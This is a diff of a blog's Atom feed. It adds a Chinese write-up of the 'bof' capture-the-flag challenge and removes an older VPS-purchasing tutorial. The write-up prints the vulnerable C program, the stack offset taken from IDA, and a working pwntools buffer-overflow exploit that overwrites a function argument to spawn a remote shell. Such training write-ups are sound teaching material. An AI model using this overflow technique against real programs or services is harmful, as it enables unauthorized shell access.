@@ -6,10 +6,36 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-10-18T08:40:05.806Z</updated>
+  <updated>2018-10-21T09:07:25.486Z</updated>
   <id>http://yoursite.com/</id>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pwn入坑之bof writeup</title>
+    <link href="http://yoursite.com/2018/10/21/bof/"/>
+    <id>http://yoursite.com/2018/10/21/bof/</id>
+    <published>2018-10-21T09:03:44.000Z</published>
+    <updated>2018-10-21T09:07:25.486Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先我们能拿到可执行文件和代码,<br>bof.c:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">char overflowme[32];</span><br><span class="line">printf(&quot;overflow me : &quot;);</span><br><span class="line">gets(overflowme);// smash me!</span><br><span class="line">if(key == 0xcafebabe)&#123;</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">printf(&quot;Nah..\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">func(0xdeadbeef);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析一下怎么拿到<code>shell</code>，可以看到当<code>key</code>等于0xcafebabe时，<br>会执行<code>/bin/sh</code>，这是拿到shell的关键了，跟踪这个变量看看从哪儿得到，发现是函数传进来的形参，<br>继续看到主函数，直接写死了<code>func(0xdeadbeef);</code>，key没法直接改变，<br>但是我们可以控制的变量是<code>overflowme</code>,提示已经很明显了，溢出；所以先拉到IDA里看看：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-21/65491882.jpg" alt="" title="" class="">                <p></p>            </figure><p><code>s</code>是我们刚刚可控的变量<code>overflowme</code>,<code>a1</code>是刚刚的形参<code>key</code>，看看地址：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-21/92523616.jpg" alt="" title="" class="">                <p></p>            </figure><p>两个变量的距离是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x50-0x1C=0x34</span><br></pre></td></tr></table></figure><p>因为代码中没有对<code>gets(overflowme)</code>进行长度的限制，所以我们现在需要做的是溢出<code>overflowme</code>变量来覆盖<code>key</code>变量进而得到shell，</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>这里需要用到<code>pwntools了</code>，如何搭建环境可以在网上找找,<br>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&apos;pwnable&apos;,9000)</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x34  + p32(0xcafebabe)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell后就很简单了.</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-21/55311916.jpg" alt="" title="" class="">                <p></p>            </figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;首先我们能拿到可执行文件和代码,&lt;br&gt;bof.c:&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;
+      
+    
+    </summary>
+    
+      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用</title>
@@ -511,32 +537,6 @@
       <category term="免流" scheme="http://yoursite.com/tags/%E5%85%8D%E6%B5%81/"/>
     
       <category term="科学上网" scheme="http://yoursite.com/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VPS的选择及购买</title>
-    <link href="http://yoursite.com/2018/05/27/vps/"/>
-    <id>http://yoursite.com/2018/05/27/vps/</id>
-    <published>2018-05-27T01:27:02.000Z</published>
-    <updated>2018-05-30T11:54:01.058Z</updated>
-    
-    <content type="html"><![CDATA[<p>这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷）</p><h3 id="注册Vultr"><a href="#注册Vultr" class="headerlink" title="注册Vultr"></a>注册Vultr</h3><p>打开<a href="https://www.vultr.com/?ref=7382462" target="_blank" rel="noopener">注册链接</a><br>点击右上方的Create Account<br>注册比较简单，输入邮箱密码创建就行<br>进入邮箱确认，登陆后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/87688976.jpg" alt="" title="" class="">                <p></p>            </figure></p><h3 id="充值"><a href="#充值" class="headerlink" title="充值"></a>充值</h3><p>点击<code>Billing</code>,然后点击<code>Make Payment</code>下的<code>Alipay</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/73845292.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择价格然后充值，第一次使用少充点，10美元就行<br>觉得好用再继续充值就行，<br>然后会跳转到支付宝的支付页面，用支付宝付款即可</p><h3 id="添加服务器"><a href="#添加服务器" class="headerlink" title="添加服务器"></a>添加服务器</h3><p>点击左侧的Servers<br>可以看到右边有个“+”号：<br>点击之后，这个页面是选择地区<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/9681133.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>在国内的话最好选择日本的服务器<br>速度最快<br>可以选择其他地区的比如纽约，洛杉矶，速度也不慢<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/35259126.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择系统类型，这里选择centos6，<br>因为centos7的防火墙可能会导致ssr的一些服务不能用<br>价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数<br>个人用的话选择最便宜的就行了。<br>下方勾选Enable IPv6，需要IPv6免流的可以勾上<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/71161788.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后直接Deploy Now即可</p><p>这里附上一种测速方法：</p><pre>使用ping命令：vutrl一开始最多可以创建5个VPS创建完之后拿ping命令去试试速度win+r 输入cmd在控制台输入：ping 你的服务器IP看看延迟就行，延迟越低速度越快如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除）</pre><h3 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h3><p>回到Servers页面<br>点击刚刚创建的服务器<br>这里的IP和密码待会得用到<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/768601.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这里有服务器的ssh<br>我们需要使用shell软件来连接他<br>这里演示的是xshell：<br>从网上直接下载xshell就可以使用：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/45907955.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点击文件，新建<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/44226464.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>名称随便写个就行，主机处填写你服务器的IP<br>然后点击左边的用户身份验证<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/14476746.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用户名写root，密码从刚刚那个页面复制下来，<br>然后点击连接就行<br>出现这个页面就代表连接成功了:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/88630009.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷）&lt;/p&gt;
-&lt;h3 id=&quot;注册Vultr&quot;&gt;&lt;a href=&quot;#注册Vultr&quot; class=&quot;headerlink&quot; title=&quot;注册Vultr&quot;&gt;&lt;/a&gt;注册Vultr&lt;/h3&gt;&lt;p&gt;打开&lt;a
-      
-    
-    </summary>
-    
-      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
-    
-    
-      <category term="vps购买" scheme="http://yoursite.com/tags/vps%E8%B4%AD%E4%B9%B0/"/>
     
   </entry>
   
